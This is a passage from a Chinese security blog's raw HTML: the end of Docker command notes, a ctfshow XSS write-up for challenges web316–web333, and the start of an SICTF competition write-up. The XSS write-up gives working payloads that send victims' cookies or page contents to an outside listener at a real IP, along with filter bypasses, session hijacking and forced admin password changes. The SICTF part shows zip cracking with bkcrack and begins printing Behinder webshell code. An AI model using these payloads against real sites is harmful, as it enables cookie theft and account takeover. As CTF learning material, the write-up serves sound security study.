class="line"># 第三方仓库拉去</span><br><span class="line">docker pull 第三方仓库地址/仓库名称/镜像名称</span><br><span class="line">docker pull hub.c.163.com/library/mysql:latest</span><br><span class="line">(默认仓库名为library,所有从官方获取镜像相当于`sudo docker image pull library/镜像名称`)</span><br></pre></td></tr></table></figure><h3 id="删除镜像-docker-rmi"><a href="#删除镜像-docker-rmi" class="headerlink" title="删除镜像(docker rmi)"></a>删除镜像(docker rmi)</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker image <span class="built_in">rm</span> 镜像名或镜像ID 或 docker rmi 镜像名或镜像ID</span><br><span class="line">docker image <span class="built_in">rm</span> hello<span class="literal">-world</span></span><br><span class="line">docker rmi <span class="number">9</span>e64176cd8a2</span><br></pre></td></tr></table></figure><p>删除镜像的前提是没有使用这个镜像的容器,如果有需要先删除容器(报错:Error response from daemon: conflict: unable to delete 镜像ID (must be forced) - image is being used by stopped container 容器ID则代表有容器使用了此镜像。)可以尝试先执行docker rm 容器ID删除容器,如果还报错,可以看我下方删除容器的具体方法。<br>几条删除命令的区别</p><ul><li><p>docker rm: 删除一个或多个 容器</p></li><li><p>docker rmi: 删除一个或多个 镜像</p></li><li><p>docker prune: 用来删除不再使用的 docker 对象</p><p>##加载镜像(docker run)</p><p>上面我们说过,镜像只是一个只读类型的文件,而我们的环境不可能只是一个这样的文件,所以我们需要把这个镜像加载成我们的环境,也就是让他变成容器。</p></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run [可选参数] 镜像名 [向启动容器中传入的命令]</span><br></pre></td></tr></table></figure><p>常用可选参数作用<br>-i表示以《交互模式》运行容器。<br>-d会创建一个守护式容器在后台运行(这样创建容器后不会自动登录容器)。<br>-t表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即分配一个伪终端。<br>–name为创建的容器命名。(默认会随机给名字,不支持中文字符!!!)<br>-v表示目录映射关系，即宿主机目录:容器中目录。注意:最好做目录映射，在宿主机上做修改，然后共享到容器上。<br>-p表示端口映射，即宿主机端口:容器中端口。 比如:-p 8080:80 就是将容器中的80端口,映射到主机中的8080端口<br>–network&#x3D;host表示将主机的网络环境映射到容器中，使容器的网络与主机相同。每个 Docker 容器都有自己的网络连接空间连接到虚拟 LAN。使用此命令则会让容器和主机共享一个网络空间。</p><p>可以启动一个系统docker run -i -d -t –name&#x3D;kali-test kalilinux&#x2F;kali-rolling(这里我使用linux的一个发行版kali作为介绍)<br>或可以简写为docker run -idt –name&#x3D;kali-test kalilinux&#x2F;kali-rolling<br>PS: 如果加载一个我们没有的镜像,docker会自动从官方仓库中进行拉去。</p><p>如果你没有下载docker&#x2F;getting-started的进行,这里会自动帮你下载<br> 成功启动后,可以在浏览器中输入<code>http://localhost:8080/</code>即可看到如下页面</p><p><img src="/2023/09/20/Docker%20file%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image/image-20230919191443576-1700990334962-124-1700994526524-99.png"></p><h2 id="使用交互式容器"><a href="#使用交互式容器" class="headerlink" title="使用交互式容器"></a>使用交互式容器</h2><p>上面我们成功将镜像变成了容器,但上述的命令中我们都加入了-d,让容器在后台运行了。下面我们就来讲如何和正在运行的容器进行交互。</p><h3 id="查看容器-docker-ps"><a href="#查看容器-docker-ps" class="headerlink" title="查看容器(docker ps)"></a>查看容器(docker ps)</h3><p>查看容器主要会用到ps命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前所有正在运行的容器</span><br><span class="line">docker ps</span><br><span class="line"># 查看当前所有的容器</span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line"># 使用过滤器(除了name外,常用的还可以指定id:id= 、所有停止的容器:status=exited,正在运行的容器:status=running 等)</span><br><span class="line"></span><br><span class="line">docker ps -f name=指定的名字</span><br><span class="line"></span><br><span class="line"># 显示2个上次创建的容器(2可以改变)</span><br><span class="line"></span><br><span class="line">docker ps -n 2</span><br><span class="line"></span><br><span class="line"># 显示最新创建的容器（包括所有状态）</span><br><span class="line"></span><br><span class="line">docker ps -l</span><br><span class="line"></span><br><span class="line"># 仅显示ip</span><br><span class="line"></span><br><span class="line">docker ps -q</span><br><span class="line"></span><br><span class="line"> # 显示容器大小</span><br><span class="line"></span><br><span class="line">docker ps -s</span><br></pre></td></tr></table></figure><table><thead><tr><th>标签</th><th>含义</th></tr></thead><tbody><tr><td>CONTAINER ID</td><td>镜像ID</td></tr><tr><td>IMAGE</td><td>创建容器的镜像名称</td></tr><tr><td>COMMAND</td><td>默认启动命令(启动时会自动执行)</td></tr><tr><td>CREATED</td><td>创建容器的日期</td></tr><tr><td>STATUS</td><td>当前的状态(启动了多久,多久之前退出等)</td></tr><tr><td>PORTS</td><td>映射的端口</td></tr><tr><td>NAMES</td><td>容器的名称</td></tr><tr><td>SIZE</td><td>容器大小(使用-s命令参数时才能看到)</td></tr></tbody></table><h3 id="启动和关闭容器"><a href="#启动和关闭容器" class="headerlink" title="启动和关闭容器"></a>启动和关闭容器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 停止容器</span><br><span class="line"></span><br><span class="line">docker container stop 容器名或容器id</span><br><span class="line"></span><br><span class="line"># 或可简写为</span><br><span class="line"></span><br><span class="line">docker stop 容器名或容器id</span><br><span class="line"></span><br><span class="line"># 强制关闭容器</span><br><span class="line"></span><br><span class="line">docker container kill 容器名或容器id</span><br><span class="line"></span><br><span class="line"># 或可简写为</span><br><span class="line"></span><br><span class="line">docker kill 容器名或容器id</span><br><span class="line"></span><br><span class="line"># 启动容器</span><br><span class="line"></span><br><span class="line">docker container start 容器名或容器id</span><br><span class="line"></span><br><span class="line"># 或可简写为</span><br><span class="line"></span><br><span class="line">docker start 容器名或容器id</span><br></pre></td></tr></table></figure><p>如果我们成功启动或者关闭一个容器的话,会返回容器名或者容器id</p><p>stop和kill的区别: stop是比较优雅的关掉一个容器,类似我们正常退出一个软件,而kill是当一个进程出现意外无法正常关闭的时候,我们强行进行关闭,有点像我们使用任务管理器进行结束进程操作</p><p>操作后台容器</p><p>之前我们下过一个kali并且放在了后台运行,如果没有下载可以执行下列命令(docker run -i -d -t –name&#x3D;kali-test kalilinux&#x2F;kali-rolling),下面我们就用下面的命令开启kali(如果你下的是其他系统,比如ubuntu也可以举一反三一下)<br>首先我们确保我们要进入的容器是开启状态的,使用docker ps -a查看其中的STATUS属性是否是Up开头,如果不是先照着上面启动容器的方法开启容器<br>我们开启容器后,如果需要在容器内执行命令,可以将后台切换到前台,也可能使用docker命令将我们需要执行的命令传入。<br>操作方法有很多种,这里我们介绍一些比较常用的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 如果我只需要执行简单的一两条命令可以使用docker exec</span><br><span class="line"></span><br><span class="line"># 执行单条命令 (-i: 启动并且保留交互式命令行; -t:作用是分配一个虚拟的终端; docker run )</span><br><span class="line"></span><br><span class="line">docker exec -it 容器名或容器id 执行的命令</span><br><span class="line"></span><br><span class="line"># 比如</span><br><span class="line"></span><br><span class="line">docker exec -it kali-test whoami</span><br><span class="line"></span><br><span class="line"># 用这种方法,我们还可以启动命令行,根据Linux的特性,系统程序会在/bin中,linux中常用的Shell有多个,其中大部分用的Linux默认的为bash</span><br><span class="line"></span><br><span class="line"># 所以我们启动命令可以自行如下命令(除了/bin/bash外,linux一般还会带/bin/sh、/bin/rbash、/bin/dash等,具体区别可以自行百度)</span><br><span class="line"></span><br><span class="line">docker exec -it 容器名或容器id /bin/bash</span><br><span class="line"></span><br><span class="line"># 比如</span><br><span class="line"></span><br><span class="line">docker exec -it kali-test /bin/bash</span><br><span class="line"></span><br><span class="line"># 除了exec外还有attach可以使用,但它有个弊端,多终端启动attach后,都会会同步显示。如果有一个窗口阻塞了，那么其他窗口也无法再进行操作。</span><br><span class="line"></span><br><span class="line">docker attach 容器名或容器id</span><br><span class="line"></span><br><span class="line"># 比如</span><br><span class="line">docker attach kali-test</span><br></pre></td></tr></table></figure><table><thead><tr><th>exec可选参数</th><th>作用</th></tr></thead><tbody><tr><td>-d</td><td>会创建一个守护式容器在后台运行(这样创建容器后不会自动登录容器)。</td></tr><tr><td>-e</td><td>设置环境变量</td></tr><tr><td>-i</td><td>表示以《交互模式》运行容器。</td></tr><tr><td>-t</td><td>表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即分配一个伪终端。</td></tr><tr><td>-u</td><td>设置用户名和UID。</td></tr><tr><td>-w</td><td>设置容器内的工作目录。</td></tr></tbody></table><h3 id="容器制作成镜像"><a href="#容器制作成镜像" class="headerlink" title="容器制作成镜像"></a>容器制作成镜像</h3><ul><li><pre><code>我们为什么要把容器制作成镜像?- 镜像可以看作为是一种备份,如果我们后期环境出现了问题,可以还原到早期镜像。- 镜像便于传播,可以让自己的其他设备或他人的重复利用变得更加简单容易。- # 将容器制作成镜像  docker commit 容器名 镜像名  # 镜像打包备份(打包备份的文件会自动存放在当前命令行的路径下,如果想让保存的文件可以打开,可以加.tar后缀)  docker save -o 保存的文件名 镜像名  # 镜像解压  docker load -i 文件路径/备份文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  我们将打包备份的镜像可以通过网络发送到其他设备上,使用docker镜像解压即可直接使用你的环境。</span><br><span class="line"></span><br><span class="line">  # Docker Dashboard(Docker 仪表板)</span><br><span class="line"></span><br><span class="line">  Docker 仪表板的主要作用为:快速访问容器日志，启动容器的 shell，并轻松管理容器生命周期（停止、删除等）。</span><br><span class="line"></span><br><span class="line">![](./../image/image-20230919194210103-1700990334962-125-1700994526524-98.png)</span><br><span class="line"></span><br><span class="line"> 在[Docker](https://so.csdn.net/so/search?q=Docker&amp;spm=1001.2101.3001.7020)中，我们无法删除正在运行的容器，请先将其停止。 </span><br><span class="line"></span><br><span class="line"> 停止所有正在运行的容器。 </span><br><span class="line"></span><br><span class="line">   Terminal  </span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">$ sudo docker stop $(sudo docker ps -aq)</span><br></pre></td></tr></table></figure></code></pre></li></ul><p> 卸下所有停止的容器。 </p><p>   Terminal  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker <span class="built_in">rm</span> $(sudo docker ps -aq)</span><br></pre></td></tr></table></figure><p>该错误的意思是docker已有一个容器占用了目前docker-compose里的subnet。<br>解决方法</p><p>1、修改当前docker-compose里的network配置，换一个subnet</p><p>2.执行命令docker network prune （原因：即使容器停止&#x2F;删除，网段依旧会被占用，运行该命令可清除占用子网网段即可）</p><p>在Dockerfile所在目录下，使用以下命令构建镜像：</p><p>其中，<code>-t</code>参数用于指定镜像的名称，<code>.</code>表示Dockerfile所在目录。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ctfshow XSS跨站脚本注入漏洞 Web316-Web333</title>
      <link href="/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/"/>
      <url>/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow-XSS跨站脚本注入漏洞-web316-web333"><a href="#ctfshow-XSS跨站脚本注入漏洞-web316-web333" class="headerlink" title="ctfshow XSS跨站脚本注入漏洞 web316-web333"></a>ctfshow XSS跨站脚本注入漏洞 web316-web333</h1><p>做题过程要用到的平台<a href="https://xss.pt/%EF%BC%8C%E5%88%9B%E5%BB%BA%E8%B4%A6%E5%8F%B7%EF%BC%8C%E5%A5%BD%E5%A4%9Aplayload%EF%BC%8C%E5%9C%A8%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E4%BA%86%E5%8F%AF%E7%9C%8B%E5%88%B0flag">https://xss.pt/，创建账号，好多playload，在项目管理了可看到flag</a></p><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>用平台上pLAYload怎么是都是有no admin，很奇怪，看到网上用服务器监听，我也监听了，就是说，为啥还是</p><p><img src="/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/image/image-20230916150656330-1700990328435-117-1700994521524-91.png"></p><p>服啦</p><p>最后用自己服务器传入</p><script>location.href="http://ip:39543/"+document.cookie</script><p>服务器python3 -m http.server 39543可得到flag</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>原理同上，<script>被过滤,换成img</p><img src='' onerror="location.href='http://ip:39543/'+document.cookie"><h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>换iframe标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=document.location=&#x27;http://ip:39543/?cookie=&#x27;+document.cookie&gt;</span><br></pre></td></tr></table></figure><h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=window.open(&#x27;http://123.57.236.154:39543/?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></figure><h2 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h2><p>过滤了空格</p><blockquote><p>绕过方法：</p><p>TAB</p><p>/</p><p>/**/</p></blockquote><p>上一题playload需要简单变换一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe/onload=window.open(&#x27;http://123.57.236.154:39543/?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></figure><p>利用String.fromCharCode来进行转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,46,115,98,47,49,66,113,117,62,60,47,115,67,114,73,112,84,62));&gt;</span><br></pre></td></tr></table></figure><h2 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321</h2><p>iframe仍然可以</p><h2 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h2><p>iframe仍然可以</p><h2 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h2><p>iframe仍然可以</p><h2 id="web324"><a href="#web324" class="headerlink" title="web324"></a>web324</h2><p>这次过滤了iframe</p><p>我不知道用啥了。。。。</p><p>看了大佬的wp，用svg还可以绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=window.open(&#x27;http://123.57.236.154:39543/?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></figure><h2 id="web325"><a href="#web325" class="headerlink" title="web325"></a>web325</h2><p>svg仍可</p><h2 id="web326"><a href="#web326" class="headerlink" title="web326"></a>web326</h2><p>svg可</p><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>到存储型xss</p><p>盲猜上一题playload可以</p><p>果然，可以</p><p>当然也可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=window.open(&#x27;http://123.57.236.154::39543/&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></figure><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://123.57.236.154:39543/&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>先注册，密码就是上面的xss，之后我们会在服务器获取到管理员的phpsession</p><p><img src="/./../image/image-20230916171228602-1700990328435-119-1700994521525-92.png" alt="image-20230916171228602"></p><p>之后将浏览器PHPsession改成监听到的，查看用户管理，可得到flag</p><p><img src="/./../image/image-20230916171325595-1700990328435-118-1700994521525-93.png"></p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>这次cookie不持久，所以就直接获取页面信息，通过document来获取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://123.57.236.154:39543/&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可直接监听到flag</p><h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>注册时用户名为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://127.0.0.1/api/change.php?p=123456&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>密码随便，将admin密码改为123456</p><p>等待一会登录admin，密码为123456</p><h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&quot;api/change.php&quot;,method:&quot;POST&quot;,data:&#123;&#x27;p&#x27;:&#x27;1234567&#x27;&#125;&#125;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>换了post传参方法。原理同上</p><h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script&gt;$.ajax(&#123;url: &quot;http://127.0.0.1/api/amount.php&quot;,method: &quot;POST&quot;,data: &#123;&#x27;u&#x27;=&#x27;gylq&#x27;,&#x27;a&#x27;:10000&#125;,cache: false,success: function(res)&#123;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>给admin账户设置为10000</p><p>注册上先，登录。给admin转-10000，在购买flag</p><h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">x=5</span><br><span class="line">url=&quot;http://274ff6c1-4707-4493-90e6-f0bddae37424.challenge.ctf.show/api/amount.php&quot;</span><br><span class="line">url2=&quot;http://274ff6c1-4707-4493-90e6-f0bddae37424.challenge.ctf.show/api/getFlag.php&quot;</span><br><span class="line">headers=&#123;&#x27;Cookie&#x27;:&#x27;PHPSESSID=2og1nbla83d4tkt7qiksqjvdpl&#x27;&#125;  #自己登录后的sessionid</span><br><span class="line">while True:</span><br><span class="line">   print(x)</span><br><span class="line">   t=x-1</span><br><span class="line">   data=&#123;</span><br><span class="line">   &#x27;u&#x27;:&#x27;111&#x27;, #注册的用户名</span><br><span class="line">   &#x27;a&#x27;:str(t)</span><br><span class="line">   &#125;</span><br><span class="line">   r=requests.post(url,headers=headers,data=data)</span><br><span class="line">   print(r.text)</span><br><span class="line">   if(x&gt;10000):</span><br><span class="line">      r2=requests.get(url2,headers=headers)</span><br><span class="line">      print(r2.text)</span><br><span class="line">      break</span><br><span class="line">   x+=t</span><br></pre></td></tr></table></figure></script></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF-2nd</title>
      <link href="/2023/09/10/SICTF-2nd/"/>
      <url>/2023/09/10/SICTF-2nd/</url>
      
        <content type="html"><![CDATA[<p>比赛打完了，虽然是个公益赛，也是拿到了名次，可是自己还是太菜了，只能做些简单题。。。</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="签到-Welcome"><a href="#签到-Welcome" class="headerlink" title="签到]Welcome"></a>签到]Welcome</h3><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194808039-1700990465940-271.png"></p><h3 id="Pixel-art"><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL import Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开PNG图像文件</span></span><br><span class="line">image = Image.<span class="title function_ invoke__">open</span>(<span class="string">&#x27;image.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取图像的宽度和高度</span></span><br><span class="line">width, height = image.size</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历每个像素</span></span><br><span class="line"><span class="keyword">for</span> y in <span class="title function_ invoke__">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> x in <span class="title function_ invoke__">range</span>(width):</span><br><span class="line">        <span class="comment"># 获取像素的RGB值</span></span><br><span class="line">        r, g, b = image.<span class="title function_ invoke__">getpixel</span>((x, y))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断RGB值并输出相应字符</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">46</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;.&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif r == <span class="number">33</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;!&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif r == <span class="number">63</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;?&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> g == <span class="number">46</span>:</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&#x27;.&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif g == <span class="number">33</span>:</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&#x27;!&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif g == <span class="number">63</span>:</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&#x27;?&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> b == <span class="number">46</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;.&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif b == <span class="number">33</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;!&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        elif b == <span class="number">63</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;?&#x27;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>………………!?!!.?………………?.?!.?….!.?…….!?!!.?!!!!!!?.?!.?!!!.!!!!!!!!!!!!!.?………!?!!.?……..?.?!.?..!.?…….!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?……………!?!!.?…………..?.?!.?……..!.?……………..!?!!.?!!!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!…!…….!.!!!!!!!.?………….!?!!.?…………?.?!.?……………………!…..!.?………….!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!…..!.!!!!!!!!!!!!!!!!!.?……………!?!!.?…………..?.?!.?…………..!.!!!!!.?……………!?!!.?!!!!!!!!!!!!!!?.?!.?!!!……………..!.?…….!?!!.?!!!!!!?.?!.?!!!!!!!……………!.?………….!?!!.?…………?.?!.?………………….!…..!.!.?……………!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!.?……………!?!!.?…………..?.?!.?……!.?………….!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!.!!!!!!!!!!!!!!!!!!!………….!.!!!!!!!!!!!!!!!!!!!………..!.!………….!.!!!!!!!!!!!!!!!!!………..!.?……………!?!!.?…………..?.?!.?!.!!!!!.!!!!!…….!.!!!.?………….!?!!.?!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!.!.?……………..!?!!.?…………….?.?!.?…………!.?.</p></blockquote><p>Short Ook</p><h3 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C flag.zip -c flag.png -x 0 89504E470D0A1A0A0000000D49484452</span><br><span class="line">bkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png</span><br></pre></td></tr></table></figure><p>010查看flag在最后</p><h3 id="Easy-Shark"><a href="#Easy-Shark" class="headerlink" title="Easy_Shark"></a>Easy_Shark</h3><p>AES冰蝎3流量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;2295d22e2d70888f&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span 